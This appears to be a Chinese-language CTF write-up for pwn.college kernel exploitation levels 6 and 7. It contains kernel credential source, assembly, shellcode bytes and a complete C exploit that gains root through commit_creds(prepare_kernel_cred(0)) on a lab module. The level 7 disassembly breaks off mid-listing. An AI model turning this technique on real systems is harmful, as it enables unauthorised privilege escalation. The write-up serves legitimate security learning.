<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>需要用到内核里的两个函数<code>prepare_kernel_cred</code>和<code>commit_creds</code><br><code>prepare_kernel_cred</code>帮助构造一个<code>cred</code><br><code>commit_creds</code>修改当前进程的<code>cred</code></p>
<h3 id="prepare-kernel-cred"><a href="#prepare-kernel-cred" class="headerlink" title="prepare_kernel_cred"></a>prepare_kernel_cred</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * prepare_kernel_cred - Prepare a set of credentials for a kernel service</span></span><br><span class="line"><span class="comment"> * @daemon: A userspace daemon to be used as a reference</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Prepare a set of credentials for a kernel service.  This can then be used to</span></span><br><span class="line"><span class="comment"> * override a task&#x27;s own credentials so that work can be done on behalf of that</span></span><br><span class="line"><span class="comment"> * task that requires a different subjective context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @daemon is used to provide a base for the security record, but can be NULL.</span></span><br><span class="line"><span class="comment"> * If @daemon is supplied, then the security data will be derived from that;</span></span><br><span class="line"><span class="comment"> * otherwise they&#x27;ll be set to 0 and no groups, full capabilities and no keys.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The caller may change these controls afterwards if desired.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns the new credentials or NULL if out of memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">  .......</span><br><span class="line">	<span class="keyword">if</span> (daemon)</span><br><span class="line">		old = get_task_cred(daemon);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		old = get_cred(&amp;init_cred);</span><br><span class="line">  .......</span><br><span class="line">  validate_creds(old);</span><br><span class="line"></span><br><span class="line">	*<span class="keyword">new</span> = *old;</span><br><span class="line">  .......</span><br><span class="line">  </span><br><span class="line">  put_cred(old);</span><br><span class="line">	validate_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当变量daemon为0时，会复制<code>init</code>进程的<code>cred</code>作为当前进程的<code>cred</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">	.usage			= ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	.subscribers		= ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">	.magic			= CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	.uid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.gid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.suid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.sgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.euid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.egid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.fsuid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.fsgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.securebits		= SECUREBITS_DEFAULT,</span><br><span class="line">	.cap_inheritable	= CAP_EMPTY_SET,</span><br><span class="line">	.cap_permitted		= CAP_FULL_SET,</span><br><span class="line">	.cap_effective		= CAP_FULL_SET,</span><br><span class="line">	.cap_bset		= CAP_FULL_SET,</span><br><span class="line">	.user			= INIT_USER,</span><br><span class="line">	.user_ns		= &amp;init_user_ns,</span><br><span class="line">	.group_info		= &amp;init_groups,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>所以执行<code>prepare_kernel_cred (0)</code>即可返回一个<code>root</code>对应的<code>cred</code></p>
<h3 id="commit-creds"><a href="#commit-creds" class="headerlink" title="commit_creds"></a>commit_creds</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * commit_creds - Install new credentials upon the current task</span></span><br><span class="line"><span class="comment"> * @new: The credentials to be assigned</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Install a new set of credentials to the current task, using RCU to replace</span></span><br><span class="line"><span class="comment"> * the old set.  Both the objective and the subjective credentials pointers are</span></span><br><span class="line"><span class="comment"> * updated.  This function may not be called if the subjective credentials are</span></span><br><span class="line"><span class="comment"> * in an overridden state.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function eats the caller&#x27;s reference to the new credentials.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Always returns 0 thus allowing this function to be tail-called at the end</span></span><br><span class="line"><span class="comment"> * of, say, sys_setgid().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commit_creds</span><span class="params">(struct cred *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current; <span class="comment">// task 指向当前进程的 task_struct 结构</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line">  </span><br><span class="line">  ......</span><br><span class="line"></span><br><span class="line">	validate_creds(old);</span><br><span class="line">	validate_creds(<span class="keyword">new</span>);</span><br><span class="line">  </span><br><span class="line">  ......</span><br><span class="line"></span><br><span class="line">	get_cred(<span class="keyword">new</span>); <span class="comment">/* we will require a ref for the subj creds too */</span></span><br><span class="line">  ......</span><br><span class="line">	<span class="comment">/* do it</span></span><br><span class="line"><span class="comment">	 * RLIMIT_NPROC limits on user-&gt;processes have already been checked</span></span><br><span class="line"><span class="comment">	 * in set_user().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	alter_cred_subscribers(<span class="keyword">new</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user)</span><br><span class="line">		atomic_inc(&amp;<span class="keyword">new</span>-&gt;user-&gt;processes);</span><br><span class="line">	rcu_assign_pointer(task-&gt;real_cred, <span class="keyword">new</span>); <span class="comment">// 修改 task 的 real_cred 为 new cred</span></span><br><span class="line">	rcu_assign_pointer(task-&gt;cred, <span class="keyword">new</span>); <span class="comment">// 修改 task 的 cred 为 new cred</span></span><br><span class="line">  </span><br><span class="line">  ......</span><br><span class="line">	<span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">	put_cred(old);</span><br><span class="line">	put_cred(old);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(commit_creds);</span><br></pre></td></tr></table></figure>

<p>该函数用来更新进程的<code>cred</code></p>
<p>所以执行<code>commit_creds(prepare_kernel_cred (0))</code>能够提升权限为root</p>
<p>本题同样没有<code>kaslr</code>，可以读取<code>/proc/kallsyms</code>获取函数地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hacker@vm_practice_babykernel_level6:~$ sudo -i</span><br><span class="line">root@vm_practice_babykernel_level6:~# cat /proc/kallsyms | grep commit_creds</span><br><span class="line">ffffffff81088d80 T commit_creds</span><br><span class="line">root@vm_practice_babykernel_level6:~# cat /proc/kallsyms | grep prepare_kernel_cred</span><br><span class="line">ffffffff810890c0 T prepare_kernel_cred</span><br></pre></td></tr></table></figure>

<p><code>commit_creds(prepare_kernel_cred (0))</code>对应汇编</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">push rsi</span><br><span class="line">mov rsi, ffffffff810890c0</span><br><span class="line">push rdi</span><br><span class="line">xor rdi, rdi</span><br><span class="line">call rsi</span><br><span class="line">mov rdi, rax</span><br><span class="line">mov rsi, ffffffff81088d80</span><br><span class="line">call rsi</span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>这里要得到shellcode对应字节码可以直接利用pwntools转换<br>或者使用<code>rasm2</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hacker@babykernel_level6:~$ rasm2 -a x86 -b 64 -C -f shellcode </span><br><span class="line">&quot;\x56\x48\xc7\xc6\xc0\x90\x08\x81\x57\x48\x31\xff\xff\xd6\x48\x89\xc7\x48\xc7\xc6&quot; \</span><br><span class="line">&quot;\x80\x8d\x08\x81\xff\xd6\x5f\x5e\xc3&quot;</span><br><span class="line"></span><br><span class="line">-a x86 x86结构</span><br><span class="line">-b 64 64位cpu</span><br><span class="line">-C 输出为C语言格式</span><br><span class="line">-f 从文件读取</span><br></pre></td></tr></table></figure>

<h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> shellcode[] = <span class="string">&quot;VH\xc7\xc6\xc0\x90\x08\x81WH1\xff\xff\xd6H\x89\xc7H\xc7\xc6\x80\x8d\x08\x81\xff\xd6_^\xc3&quot;</span>;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/pwncollege&quot;</span>, O_RDWR);</span><br><span class="line">  write(fd, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">  <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">  read(fd2, buffer, <span class="number">100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="level6-1"><a href="#level6-1" class="headerlink" title="level6.1"></a>level6.1</h1><p>没差</p>
<h1 id="level7-0"><a href="#level7-0" class="headerlink" title="level7.0"></a>level7.0</h1><h2 id="init-module-1"><a href="#init-module-1" class="headerlink" title="init_module"></a>init_module</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v10; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v11; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v13; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v14; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v15; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v16; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v17; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  shellcode = _vmalloc(<span class="number">0x1000</span>LL, <span class="number">0xCC0</span>LL, _default_kernel_pte_mask &amp; <span class="number">0x163</span>);</span><br><span class="line">  proc_entry = proc_create(<span class="string">&quot;pwncollege&quot;</span>, <span class="number">438L</span>L, <span class="number">0L</span>L, &amp;fops);</span><br><span class="line">  printk(&amp;unk_AFA, <span class="number">438L</span>L, v0, v1);</span><br><span class="line">  printk(&amp;unk_920, <span class="number">438L</span>L, v2, v3);</span><br><span class="line">  printk(&amp;unk_AFA, <span class="number">438L</span>L, v4, v5);</span><br><span class="line">  printk(&amp;unk_950, <span class="number">438L</span>L, v6, v7);</span><br><span class="line">  printk(&amp;unk_9B8, <span class="number">438L</span>L, v8, v9);</span><br><span class="line">  printk(&amp;unk_A18, <span class="number">438L</span>L, v10, v11);</span><br><span class="line">  printk(&amp;unk_A58, <span class="number">438L</span>L, v12, v13);</span><br><span class="line">  printk(&amp;unk_AA0, <span class="number">438L</span>L, v14, v15);</span><br><span class="line">  printk(&amp;unk_B01, <span class="number">438L</span>L, v16, v17);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>初始化的时候vmalloc了一块内存<code>shellcode</code></p>
<h2 id="device-ioctl-2"><a href="#device-ioctl-2" class="headerlink" title="device_ioctl"></a>device_ioctl</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">device_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> shellcode_length; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> (*shellcode_execute_addr[<span class="number">4</span>])(<span class="keyword">void</span>); <span class="comment">// [rsp+8h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  shellcode_execute_addr[<span class="number">1</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_8F0, file, cmd);</span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">1337</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(&amp;shellcode_length, arg, <span class="number">8L</span>L);</span><br><span class="line">    copy_from_user(shellcode_execute_addr, arg + <span class="number">0x1008</span>, <span class="number">8L</span>L);</span><br><span class="line">    result = <span class="number">-2L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( shellcode_length &lt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      copy_from_user(shellcode, arg + <span class="number">8</span>, shellcode_length);</span><br><span class="line">      _x86_indirect_thunk_rax();</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>汇编</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">.text.unlikely:00000000000007EC ; __int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)</span><br><span class="line">.text.unlikely:00000000000007EC device_ioctl    proc near               ; DATA XREF: .data:fops↓o</span><br><span class="line">.text.unlikely:00000000000007EC</span><br><span class="line">.text.unlikely:00000000000007EC shellcode_length&#x3D; qword ptr -28h</span><br><span class="line">.text.unlikely:00000000000007EC shellcode_execute_addr&#x3D; qword ptr -20h</span><br><span class="line">.text.unlikely:00000000000007EC var_18          &#x3D; qword ptr -18h</span><br><span class="line">.text.unlikely:00000000000007EC</span><br><span class="line">.text.unlikely:00000000000007EC file &#x3D; rdi                              ; file *</span><br><span class="line">.text.unlikely:00000000000007EC cmd &#x3D; rsi                               ; unsigned int</span><br><span class="line">.text.unlikely:00000000000007EC arg &#x3D; rdx                               ; unsigned __int64</span><br><span class="line">.text.unlikely:00000000000007EC                 push    rbp</span><br><span class="line">.text.unlikely:00000000000007ED                 mov     rcx, arg</span><br><span class="line">.text.unlikely:00000000000007F0                 mov     ebp, esi</span><br><span class="line">.text.unlikely:00000000000007F2 cmd &#x3D; rbp                               ; unsigned int</span><br><span class="line">.text.unlikely:00000000000007F2                 push    rbx</span><br><span class="line">.text.unlikely:00000000000007F3                 mov     rbx, arg</span><br><span class="line">.text.unlikely:00000000000007F6 arg &#x3D; rbx                               ; unsigned __int64</span><br><span class="line">.text.unlikely:00000000000007F6                 mov     edx, esi</span><br><span class="line">.text.unlikely:00000000000007F8                 mov     rsi, file</span><br><span class="line">.text.unlikely:00000000000007FB                 mov     file, offset unk_8F0</span><br><span class="line">.text.unlikely:0000000000000802                 sub     rsp, 18h</span><br><span class="line">.text.unlikely:0000000000000806                 mov     rax, gs:28h</span><br><span class="line">.text.unlikely:000000000000080F                 mov     [rsp+28h+var_18], rax</span><br><span class="line">.text.unlikely:0000000000000814                 xor     eax, eax</span><br><span class="line">.text.unlikely:0000000000000816                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:000000000000081B                 or      rax, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text.unlikely:000000000000081F                 cmp     ebp, 539h</span><br><span class="line">.text.unlikely:0000000000000825                 jnz     short loc_87D</span><br><span class="line">.text.unlikely:0000000000000827                 mov     edx, 8</span><br><span class="line">.text.unlikely:000000000000082C                 mov     rsi, arg</span><br><span class="line">.text.unlikely:000000000000082F                 mov     rdi, rsp</span><br><span class="line">.text.unlikely:0000000000000832                 call    _copy_from_user ; PIC mode</span><br><span 